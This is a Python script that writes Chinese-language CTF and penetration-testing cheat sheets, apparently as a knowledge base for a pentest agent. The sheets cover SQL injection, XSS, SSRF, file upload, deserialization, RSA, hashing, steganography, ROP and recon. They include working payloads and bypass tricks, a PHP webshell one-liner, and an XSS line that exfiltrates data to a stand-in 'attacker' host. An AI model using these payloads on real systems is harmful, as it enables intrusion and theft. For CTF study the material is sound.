from pathlib import Path
base = Path(r'D:\webstudy\FlagHunter\pentestagent\knowledge\sources')
base.mkdir(parents=True, exist_ok=True)
files = {
'web_sqli.md': '''# SQL 注入速查

## 原理
SQL 注入的本质是应用把不可信输入直接拼接进 SQL 语句，导致攻击者能改变原有查询语义。CTF 中最常见的是 `id=1`、`name=admin`、搜索框、排序字段、分页字段和 JSON 参数。漏洞产生的核心原因通常有三类：一是字符串拼接且未参数化；二是把用户可控内容放入 `ORDER BY`、`LIMIT`、`UNION SELECT` 等结构位置；三是黑名单过滤不完整，导致大小写、注释、编码或多字节绕过。

SQL 注入常见分类包括：联合查询注入、报错注入、布尔盲注、时间盲注、堆叠查询、二次注入。联合查询适合直接回显数据；布尔盲注适用于无报错但页面内容有差异的场景；时间盲注适用于完全无回显时基于延迟判断条件真假。CTF 常把过滤和信息泄露链条结合，例如先用 `order by` 探测列数，再用 `union select` 拼接回显位，最后读取 flag 表或 `information_schema`。

识别步骤通常是：先探测单引号、括号、注释是否影响响应；再测试 `and 1=1` / `and 1=2` 是否有差异；然后尝试 `order by 1`、`order by 2` 判断列数；若可联合查询，再用 `union select null,...` 找回显位。很多题目会把注入点藏在 Cookie、Header、POST JSON、GraphQL 变量、文件名或下载参数里，不要只盯着 GET。

## 工具命令示例
- 联合查询探测：`id=1 order by 3--+`
- 回显位判断：`id=-1 union select 1,2,3--+`
- MySQL 枚举库表：`union select 1,group_concat(schema_name),3 from information_schema.schemata--+`
- 枚举字段：`union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+`
- 布尔盲注：`id=1 and ascii(substr((select database()),1,1))>100--+`
- 时间盲注：`id=1 and if(substr(database(),1,1)='d',sleep(5),0)--+`
- sqlmap 基础：`sqlmap -u "http://target/vuln.php?id=1" --batch --level=2 --risk=1`
- 带 Cookie：`sqlmap -u "http://target/item?id=1" --cookie="PHPSESSID=..." --batch`
- 指定 POST：`sqlmap -u "http://target/login" --data="u=admin&p=1" --batch`

## 绕过技巧
常见绕过包括注释变形（`--+`、`#`、`/**/`）、关键字大小写混淆、内联注释（`UN/**/ION`）、双写关键字、URL 编码、十六进制字符串、使用等价函数替代（`mid` / `substr`、`ascii` / `ord`）、通过 `group_concat` 聚合减少请求次数。面对空格过滤时，可用换行、制表符、注释或括号代替。面对 `union` 过滤时，尝试报错函数、布尔盲注或堆叠语句；面对 `select` 过滤时，可借视图、子查询、括号表达式、数据库特性绕过。

## 常见 CTF 题型
1. 登录框盲注，flag 放在数据库表内。
2. 搜索参数联合查询，要求读 `flag` 字段。
3. 过滤空格、引号或 `union` 的绕过题。
4. 二次注入：注册时写入 payload，后台管理处触发。
5. `ORDER BY` / `LIMIT` 注入，用于结构性位置绕过。
6. JSON / GraphQL / Cookie 注入，需要找对参数位置。

实战中建议先确认数据库类型，再决定 payload 体系。MySQL 常配合 `information_schema`、`updatexml`、`extractvalue`；SQLite 更依赖 `sqlite_master`；PostgreSQL 关注 `pg_catalog`；MSSQL 常见 `waitfor delay`。如果最终目标是拿 flag，不必盲目 dump 全库，优先定位最短路径：当前库名、表名、字段名、flag 值。
''',
'web_xss.md': '''# XSS 速查

## 原理
跨站脚本的核心是让攻击者控制的脚本在受害者浏览器内执行。根据注入位置可分为反射型、存储型和 DOM 型。反射型常出现在搜索、报错、跳转参数中；存储型常出现在评论、签名、私信、公告等持久化位置；DOM 型则发生在前端 JS 读取 `location`、`hash`、`postMessage`、`innerHTML` 等危险 sink 时。

判断 XSS 时要同时关注三件事：输入点、上下文、执行 sink。相同 payload 在 HTML 文本、属性、JavaScript 字符串、URL、CSS 上下文中的效果完全不同。比如在 HTML 文本里 `<script>alert(1)</script>` 可能成立，但在属性值中更可能需要 `" onmouseover=alert(1) x="`，在 JS 字符串中则可能需要 `';alert(document.domain);//`。CTF 喜欢把过滤规则设计成“几乎能防住”，考验上下文逃逸而不是简单弹窗。

## 工具命令示例
- 基础测试：`<script>alert(1)</script>`
- 图片事件：`<img src=x onerror=alert(1)>`
- SVG：`<svg onload=alert(1)>`
- 属性逃逸：`" autofocus onfocus=alert(1) x="`
- JS 字符串逃逸：`';alert(document.domain);//`
- DOM 追踪：浏览器 DevTools 搜索 `innerHTML`、`outerHTML`、`document.write`、`eval`
- 批量扫描可用 `dalfox url http://target/?q=FUZZ`

## 绕过技巧
常见绕过包括大小写混写、标签替换、事件替换、利用浏览器自动补全、编码绕过、模板语法注入、基于 `srcdoc` 或 `iframe` 的二次执行。过滤 `<script>` 时，可切换到 `img/svg/body` 事件；过滤引号时，可尝试无引号属性、模板字面量或实体编码；过滤 `alert` 时，可改用 `confirm`、`prompt`、`top['al'+'ert'](1)`。如果 CSP 严格，思路要转向 JSONP、可信域脚本、nonce 泄露、DOM gadget、postMessage 链接或能带出 token 的无脚本利用。

## 常见 CTF 题型
1. 评论区存储型 XSS，管理员 bot 携带 flag Cookie 访问。
2. 反射型 XSS 配合长度限制、标签白名单或实体过滤。
3. DOM XSS，通过 `location.hash`、`postMessage`、模板渲染触发。
4. Sandbox/CSP 绕过题，需要寻找站内 gadget。
5. 富文本编辑器题，考察清洗器绕过或 Markdown -> HTML 转换漏洞。

## 拿分路径
在 CTF 中，XSS 的目标通常不是“弹窗”，而是“读 flag”或“让 bot 带着敏感上下文访问你的收集端”。因此 payload 设计要以结果为导向，例如抓取页面中隐藏 flag、读取管理员可见内容、发起站内请求、利用同源能力窃取 token。若题目给了 bot，先确认 bot 的访问频率、User-Agent、是否允许外带请求；很多时候一个 `fetch('/flag').then(r=>r.text()).then(x=>location='https://attacker/?d='+btoa(x))` 就是最短路径。
''',
'web_ssrf.md': '''# SSRF 速查

## 原理
SSRF 是服务端根据用户提供的 URL 或主机名主动发起请求，攻击者借此让服务器访问本来外部无法直连的目标。典型入口包括图片抓取、Webhook、在线预览、PDF 渲染、视频转码、URL 探测、头像同步、回调通知。CTF 中 SSRF 经常是通往内网、云元数据、调试接口、Redis/gopher、文件协议的跳板。

排查时要关注请求端能力：支持哪些协议、能否自定义方法和 Header、是否跟随重定向、是否保留响应体、返回的是回显还是盲打。很多题面会伪装成“只能抓图片”，但底层是高权限 HTTP 客户端，实际上能打 `http://127.0.0.1/admin`、`http://169.254.169.254/latest/meta-data/`，甚至通过 `gopher://` 构造原始 TCP 载荷。

## 工具命令示例
- 基础探测：`http://127.0.0.1/`
- 云元数据（AWS）：`http://169.254.169.254/latest/meta-data/`
- GCP：`http://metadata.google.internal/computeMetadata/v1/`
- Kubernetes：`https://kubernetes.default.svc`
- 使用 Burp Collaborator / interactsh 做盲 SSRF 观测

## 绕过技巧
黑名单常拦截 `127.0.0.1`、`localhost`、`169.254.169.254`。绕过方法包括十进制 IP、八进制/十六进制 IP、IPv6、DNS rebinding、短域名跳转、302 重定向、用户名密码段、`@` 截断、混合编码、`http://127.1/`、`http://2130706433/`。如果应用只允许某些后缀，可能还能利用 URL 解析差异、嵌套协议、文件扩展名欺骗。若 SSRF 只返回“成功/失败”而无响应体，则优先打外带通道或端口探测逻辑。

## 常见 CTF 题型
1. 读取云元数据拿 AK/SK 或 token。
2. 打内网管理面板，借本地信任拿 flag。
3. 通过 gopher 打 Redis、FastCGI、Memcached、SMTP。
4. 利用 PDF/截图服务触发二次 SSRF。
5. SSRF 与 URL 解析差异结合的过滤绕过题。

## 作战思路
先证明确实是服务端发请求，再逐步扩大：本机回环、内网地址、云元数据、协议扩展。若拿到回显，优先寻找最短 flag 路径；若是盲 SSRF，则构造外带探针确认协议和连通性。CTF 里常见隐藏点是：应用表面限制协议为 HTTP，但底层库会先解析再转发，导致重定向到 `gopher://`、`file://` 或 Unix socket 代理成为可能。
''',
'web_file_upload.md': '''# 文件上传绕过速查

## 原理
文件上传漏洞发生在服务端把用户可控文件落盘并在危险位置解析、执行或对外暴露。问题通常不只是“能上传文件”，而是“能上传什么、落在哪里、会不会被解释器执行、后续是否可访问”。CTF 中最经典的目标是上传一句话木马、拿到 webshell、触发二次解析，或者通过图片处理链打到命令执行。

一个完整的上传链路要看：前端校验、后端 MIME/后缀/内容校验、文件名处理、重命名逻辑、存储路径、访问路径、Web 服务器解析规则、异步缩略图/解压/预览服务。很多题不是直接允许 `.php`，而是通过双扩展名、大小写、特殊分隔符、空字节、解压缩、图片马等方式绕过。

## 工具命令示例
- 伪装 PHP 图片马：JPEG 头后插入 `<?php system($_GET['cmd']); ?>`
- 常见后缀：`.php .phtml .php5 .phar .asp .aspx .jsp`
- 双后缀：`shell.php.jpg`
- 大小写绕过：`shell.pHp`
- Burp Repeater 修改 `Content-Type: image/jpeg`
- 检查访问路径：上传后访问 `/uploads/文件名`

## 绕过技巧
1. 仅看后缀：改双扩展、大小写、点号变体。
2. 仅看 MIME：改 `Content-Type`。
3. 看文件头：构造 polyglot，例如 JPEG+PHP。
4. 强制重命名：关注是否仍保留可执行目录或可控访问地址。
5. 解压上传：zip-slip、压缩包内软链接、目录穿越。
6. 图片处理链：ImageMagick、Ghostscript、Exif 解析、SVG 外链。
7. Nginx/Apache 解析差异：如 `.php.jpg` 被错误解析。

## 常见 CTF 题型
- 图片上传题：前端限制扩展名，后端只看 MIME。
- 多后缀解析题：上传到可执行目录拿 shell。
- ZIP 上传题：通过解压路径穿越写到 Web 根。
- SVG/Office/PDF 预览题：通过预览服务触发 SSRF / XXE / RCE。
- 文件名注入题：利用模板拼接、命令拼接或路径穿越。

## 实战要点
优先弄清楚上传结果的访问路径和解析环境。如果上传点最终把文件存到对象存储且不会解释执行，那传统 webshell 思路就无意义，应转向存储型 XSS、XXE、图像库利用或后续处理任务。CTF 经常会故意给一个假的上传成功提示，实际要去猜测真实保存文件名或目录，因此抓响应 JSON、查看页面渲染逻辑、检查缩略图 URL 往往比盲试 payload 更快。
''',
'web_deserialize.md': '''# 反序列化漏洞速查

## 原理
反序列化漏洞的本质是应用把不可信数据还原为对象图，而对象在恢复过程中触发魔术方法、回调、类型解析、模板渲染或表达式执行。PHP 常见点是 `unserialize()` 配合 `__wakeup/__destruct/__toString`；Java 常见原生序列化、Jackson、Fastjson、XStream、SnakeYAML；Python 常见 `pickle`、`yaml.load`、某些模板或缓存对象恢复。

CTF 中，反序列化常配合 gadget chain：单个类本身不危险，但多个对象在生命周期里组合后能到达文件写入、命令执行、任意方法调用、SSRF 或 flag 读取。分析时要先找入口：Cookie、Session、remember-me、缓存、消息队列、导入文件、RPC；再找危险方法：析构、字符串转换、动态调用、模板渲染、反射、文件操作、系统命令。

## 工具命令示例
- PHP 序列化样本：`O:4:"Test":1:{s:4:"name";s:4:"flag";}`
- phpggc：`phpggc Laravel/RCE1 system id`
- ysoserial：`java -jar ysoserial.jar CommonsCollections6 'id'`
- Fastjson 探测：`{"@type":"java.net.Inet4Address","val":"x.dnslog"}`
- Python pickle 危险点：`__reduce__`

## 绕过技巧
- PHP：利用属性可见性、引用、数组包裹、POP 链和 phar 反序列化。
- Java：寻找依赖库 gadget，注意 JDK 版本和黑名单差异。
- Python：若无法直接 pickle，可寻找 YAML、cache、Celery 等变种入口。
- 文件协议：`phar://` 常用于通过文件操作函数隐式触发反序列化。
- 黑名单绕过：改类名大小写、嵌套容器、编码、压缩、签名伪造。

## 常见 CTF 题型
1. PHP POP 链读 flag 或写 shell。
2. Java 反序列化直接命令执行。
3. Fastjson / Jackson 类型注入触发远程类加载或本地 gadget。
4. Python pickle 通过 `__reduce__` 执行系统命令。
5. Phar 结合文件上传或文件存在性检查的隐式触发。

## 分析方法
对源码题，先从 `unserialize` / `pickle.loads` / `ObjectInputStream` 入口反推可达方法；对黑盒题，先识别编码格式与签名机制，搞清序列化边界。很多 CTF 题会加一个 HMAC 或 base64 外壳，难点不是 gadget，而是先恢复数据格式。若应用只允许有限类，寻找能串出 side effect 的白名单对象；若类很多，优先搜 `__destruct`、`eval`、`system`、`call_user_func`、模板渲染和文件写入。
''',
'crypto_rsa.md': '''# RSA 弱点速查

## 原理
RSA 安全性依赖大整数分解难题与正确参数选择。CTF 中常见的不是完整破 RSA，而是参数设置错误：`e` 太小、同模攻击、私钥指数过小、明文过短、重复使用素数、泄露高位/低位、已知部分明文、CRT 参数泄露等。分析时先收集 `n, e, c` 以及是否有多个样本、多个模数、同一消息多次加密、是否能获得签名或解密 oracle。

## 工具命令示例
- Sage 求逆：`pow(e, -1, phi)`
- Wiener's attack：`RsaCtfTool --publickey pub.pem --attack wiener`
- common modulus：解 `m = c1^a * c2^b mod n`
- low e：当 `m^e < n` 时直接开 e 次根
- Hastad broadcast：同一明文、相同 e、不同互素模数，用 CRT 合并后开根

## 常见攻击
1. Low e：`e=3` 且明文太小，没有模回绕，可直接 `iroot(c, 3)`。
2. Common Modulus：同一 `n` 被不同 `e1/e2` 使用且明文相同，利用扩展欧几里得恢复 `m`。
3. Wiener：当 `d` 过小，可通过连分数逼近恢复私钥。
4. Fermat / Close Primes：`p` 和 `q` 太接近，适合费马分解。
5. Partial Key Exposure：已知 `p` 高位或低位，可用 Coppersmith。
6. CRT 泄露：知道 `dp/dq` 或故障签名，可重建私钥。

## 常见 CTF 题型
- 给出两个密文、同模不同指数，考 common modulus。
- 给出多个 `n,e,c`，同一消息广播到多个目标，考 Hastad。
- 给出畸形私钥参数，考 Wiener/骨架恢复。
- 给出部分 `p` 位数或 `dp`，考格攻击。
- 给出签名服务，考低公钥指数或故障恢复。

## 作战思路
RSA 题不要上来就暴力分解。先判断参数结构：`e` 是否异常小、是否多组 `(n,e,c)`、模数之间是否有 `gcd`、`p,q` 是否过近、是否有已知明文或格式如 `flag{`。如果题目有明显格式，可配合 Franklin-Reiter、Coppersmith、相关消息攻击。若是签名题，则注意区分加密与签名验证场景。
''',
'crypto_hash.md': '''# Hash 题速查

## 原理
Hash 相关 CTF 题常围绕三个方向：碰撞、长度扩展、弱校验逻辑。关键不在于“MD5/SHA1 不安全”这句空话，而在应用怎么使用它：是做文件完整性、签名、口令存储，还是简单地把 `md5(secret || msg)` 当 MAC。分析时先看拼接顺序、是否有盐、是否是 HMAC、是否能控制前缀/后缀、是否需要维持文件语义。

## 工具命令示例
- 长度扩展：`hashpump -s <digest> -d "data" -a "&admin=1" -k <len>`
- MD5 碰撞文件：`fastcoll`、`hashclash`
- Python 验证：`hashlib.md5(data).hexdigest()`
- 常见口令破解：`john`、`hashcat`

## 常见利用
1. 长度扩展：适用于 Merkle–Damgård 结构且使用 `hash(secret || message)` 的场景。
2. 碰撞：制造两份不同内容、相同摘要的文件或前缀块。
3. 弱比较：服务端用 `==`、前缀比较、大小写不敏感、截断比较。
4. 密码存储弱：直接 MD5/SHA1、无盐、多轮不足，适合字典攻击。

## 常见 CTF 题型
- Web 登录逻辑用 `md5(secret||query)`，要求构造管理员参数，典型长度扩展。
- 上传平台只校验 MD5，要求提交两份碰撞文件。
- 比较逻辑只看 hash 前几位，要求暴力找前缀碰撞。
- API 令牌为 `sha1(username+time)`，可预测伪造。

## 作战思路
先判断是不是 HMAC。若是 `HMAC(secret, msg)`，长度扩展通常不成立；若是简单拼接 hash，优先试长度扩展。很多 CTF 还会把 hash 与 PHP 弱类型比较结合，如 magic hash 触发 `0e...` 数值比较陷阱，这类题的关键不是密码学，而是语言语义与输入编码。
''',
'misc_stego.md': '''# 隐写与流量取证速查

## 原理
隐写题的目标通常是从看似正常的媒体、文本、协议、文件结构中恢复隐藏信息。常见载体包括 PNG/JPEG/BMP/WAV、压缩包、PCAP、二维码、文档元数据、调色板、Alpha 通道、EXIF、频谱图。处理这类题时，不要一开始就盲跑大工具，先做被动勘察：文件头、尾部、大小、熵、字符串、元数据、附加数据、颜色通道、流量方向、时间序列。

## 工具命令示例
- 文件识别：`file sample.png`、`binwalk -e sample.png`
- 元数据：`exiftool sample.jpg`
- 字符串：`strings -n 6 sample.bin`
- PNG 结构：`pngcheck -v sample.png`
- 音频频谱：`audacity`
- LSB：`zsteg image.png`
- steghide：`steghide extract -sf image.jpg`
- PCAP：`tshark -r traffic.pcap -q -z io,stat,1`

## 常见题型
1. LSB 隐写：最低有效位藏信息。
2. 附加文件：图片后拼接 zip、rar、base64 文本。
3. 调色板/透明通道：通过像素 alpha 或 palette 编码 bit。
4. 音频频域：频谱图上藏二维码、文字、DTMF、摩斯。
5. PCAP 流量取证：从 HTTP、DNS、ICMP、WebSocket 流量中提取片段。
6. 文档元数据：PDF/Office 备注、修订、隐藏层、对象流。

## 分析技巧
先检查文件尾部和容器结构；图像题先看尺寸异常、颜色数量、单通道差异、行列规律；流量题先找协议层级和时间轴，再看是否存在 base64、hex、分片、固定长度 beacon。发现多份相似文件时，考虑做差分比较。

## 常见 CTF 题型
- PNG 中用 `zsteg` 直接抽出 flag。
- 图片拼接 zip，需要 `binwalk -e` 或手工 carve。
- PCAP 中 DNS 子域名逐段携带 base32 数据。
- 音频 spectrogram 中藏二维码，再扫出 flag。
- 文档修订记录或 PDF 注释对象里藏答案。
''',
'pwn_bof.md': '''# 栈溢出与 ROP 速查

## 原理
PWN 中最常见的内存破坏题是栈溢出。函数把超长输入写入固定长度缓冲区，覆盖保存的返回地址、栈 canary、基址指针或相邻对象。利用时要先搞清楚保护：NX、PIE、Canary、RELRO、FORTIFY、沙箱。不同保护组合决定路线：无 NX 可直接 shellcode；有 NX 往往需要 ret2libc/ROP；有 PIE 需要先泄露基址；有 Canary 需要先读出 canary 或寻找非栈控制点。

## 工具命令示例
- 保护检查：`checksec --file=./vuln`
- 崩溃偏移：`cyclic 300` / `cyclic -l 0x6161616b`
- 查看符号：`readelf -s ./vuln`
- ROP gadget：`ROPgadget --binary ./vuln`
- pwntools：`elf = ELF('./vuln', checksec=False)`、`rop = ROP(elf)`
- 动调：`gdb ./vuln`、`pwndbg`

## 常见利用路线
1. ret2win：直接覆盖返回地址到隐藏函数。
2. ret2libc：泄露 libc 地址后调用 `system('/bin/sh')`。
3. ROP chain：拼接 gadget 设置参数，调用目标函数。
4. SROP：利用 `sigreturn` 构造寄存器上下文。
5. 栈迁移：可控栈空间小时迁移到 `.bss` 或 heap。
6. 格式化字符串 + BOF：先泄露地址和 canary，再完成劫持。

## 常见 CTF 题型
- 32 位 ret2shellcode / ret2system。
- 64 位 PIE + Canary，需要两阶段泄露。
- `puts@got` 泄露 libc，再返回 main 打第二轮。
- 只能 partial overwrite，需利用低字节碰撞或 one_gadget。
- seccomp/sandbox 下改做 ORW（open-read-write）链读取 flag 文件。

## 作战方法
先证明确切原语：能覆盖多少字节、能否控制 RIP/EIP、是否有 null 截断、是否有重复输入机会。接着建立最短利用路径：有 win 函数先 ret2win；无 win 但能泄露则 ret2libc；无泄露则找 fmtstr、数组越界、UAF 或信息泄露点配合。很多题最短路径是泄露 `puts@got`、算 libc、`system('/bin/sh')` 或 ORW 读 `./flag`。
''',
'recon_methodology.md': '''# 信息收集方法论

## 原理
信息收集的目标不是尽可能多跑工具，而是尽快建立目标的攻击面模型：有哪些域名、端口、服务、框架、认证边界、上传点、管理面板、历史资产和外部依赖。无论是 CTF Web、内网渗透还是实验靶场，侦察阶段都应先做低噪声、高价值的被动观察，再逐步进入主动枚举。

## 基本流程
1. 目标归一化：确认 IP、域名、CIDR、URL、协议、登录上下文。
2. 端口与服务：用 `nmap` / `rustscan` 确认开放端口、服务版本、脚本线索。
3. Web 指纹：识别中间件、框架、静态资源、API 入口、登录页、上传页。
4. 目录与参数：枚举常见路径、JS 文件、接口定义、Swagger、GraphQL、备份文件。
5. 身份边界：Cookie、JWT、SSO、默认口令、访客/管理员差异。
6. 资产关联：子域、证书、DNS、历史路径、开发环境、对象存储。
7. 验证与收敛：把发现整理成可执行的下一步。

## 工具命令示例
- 端口：`nmap -sV -Pn target`
- Web 指纹：`whatweb http://target`
- 目录枚举：`ffuf -u http://target/FUZZ -w wordlist.txt -mc all -fc 404`
- 抓 JS 路径：浏览器 DevTools / `curl | grep`
- 子域名：`subfinder -d example.com`
- 证书线索：查看证书 SAN、反代头、CDN 头部

## 常见 CTF 题型
- 主页很干净，但 `main.js` 泄露 `/api/debug`。
- 端口扫描发现额外管理端口，例如 8080、5000、7001。
- `robots.txt`、`.git/`、备份包、源映射文件泄露关键信息。
- 登录前台无入口，但 `swagger-ui`、`actuator`、`graphql` 暴露内部接口。
- 靶场把 flag 放在不常用虚拟主机或二级目录里，需要 Host 头枚举。

## 实战原则
先证据后假设；先打一条完整链再扩展；避免重复扫描同一资产；重视客户端资产如 JS、source map、API schema；记录域名、端口、认证状态、异常响应、版本号，方便后续 agent 继续推理。CTF/内网场景下优先相信运行时表现。
'''
}
for name, content in files.items():
    (base / name).write_text(content, encoding='utf-8')
print('WROTE', len(files), 'FILES')
for name in sorted(files):
    print(name)
